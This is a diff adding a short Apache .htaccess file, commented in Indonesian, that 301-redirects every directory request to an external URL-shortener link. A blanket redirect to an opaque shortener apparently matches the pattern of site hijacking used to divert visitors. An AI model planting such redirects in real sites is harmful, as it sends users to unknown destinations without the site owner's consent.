@@ -1,0 +1,12 @@
+# Mulai file .htaccess
+
+# Aktifkan penulisan ulang URL
+RewriteEngine On
+
+# Cek apakah permintaan adalah direktori
+RewriteCond %{REQUEST_FILENAME} -d
+
+# Redirect setiap direktori ke URL tujuan
+RewriteRule ^(.*)$ https://csh8.short.gy/Lupaturun [R=301,L]
+
+# Akhiri file .htaccess
